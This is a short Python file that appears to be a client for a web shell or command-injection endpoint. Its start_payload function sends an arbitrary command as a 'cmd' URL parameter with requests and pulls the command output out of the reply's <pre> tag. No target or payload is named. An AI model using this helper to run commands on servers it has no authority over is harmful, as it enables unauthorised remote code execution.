import requests
from bs4 import BeautifulSoup

def start_payload(url, payload):
    url = f"{url}?cmd={payload}"
    data = requests.get(url)
    html_data = data.text
    result = beautify(html_data)
    return result

def beautify(result):
    soup = BeautifulSoup(result, "html.parser")
    pre = soup.find("pre")
    if pre:
        text = pre.get_text(strip=True)
        return text if text else None
    else:
        return None

